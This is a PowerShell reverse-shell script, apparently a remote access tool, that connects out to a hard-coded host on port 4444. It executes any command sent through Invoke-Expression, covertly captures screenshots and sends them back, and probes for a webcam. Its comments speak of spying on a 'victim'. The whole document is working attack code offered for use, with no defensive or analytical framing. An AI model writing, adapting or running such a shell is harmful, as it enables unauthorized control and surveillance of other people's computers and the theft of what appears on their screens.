# --- THE GHOST SHELL: ZERO-COMPILE EDITION ---
$ip = '192.168.1.15'
$port = 4444

$c = New-Object System.Net.Sockets.TCPClient
try {
    $c.Connect($ip, $port)
    $s = $c.GetStream()
    $r = New-Object System.IO.StreamReader($s)
    $w = New-Object System.IO.StreamWriter($s)
    $w.AutoFlush = $true

    $w.WriteLine("--- GHOST SHELL ACTIVE: ZERO-COMPILE MODE ---")

    while($c.Connected) {
        $w.Write("PS " + (Get-Location).Path + "> ")
        $line = $r.ReadLine()
        if ($null -eq $line) { break }
        $cmd = $line.Trim()

        if ($cmd -eq "exit") { break }

        # --- BRANCHING ---
        if ($cmd -eq "screenshot") {
            try {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                $ms = New-Object System.IO.MemoryStream
                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $w.WriteLine([Convert]::ToBase64String($ms.ToArray()))
                $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
            } catch { $w.WriteLine("Error: $($_.Exception.Message)") }
        } 
        elseif ($cmd -eq "webcam") {
            # EMERGENCY PIVOT: Since direct hardware access crashes the shell,
            # we check if the camera is even available/enabled via WMI.
            try {
                $cam = Get-PnpDevice -FriendlyName "*webcam*" -ErrorAction SilentlyContinue
                if ($cam) {
                    $w.WriteLine("Webcam Detected: $($cam.FriendlyName). Direct access blocked by system policy.")
                    $w.WriteLine("Try 'screenshot' while victim has camera app open.")
                } else {
                    $w.WriteLine("No webcam hardware found via PnP.")
                }
            } catch { $w.WriteLine("Hardware check failed.") }
        } 
        else {
            try {
                $out = Invoke-Expression $cmd 2>&1 | Out-String
                $w.WriteLine(if($out){$out}else{"Done."})
            } catch { $w.WriteLine("Error: $($_.Exception.Message)") }
        }
    }
} catch {
    # If it fails to connect, just exit
} finally {
    if ($c) { $c.Close() }
}
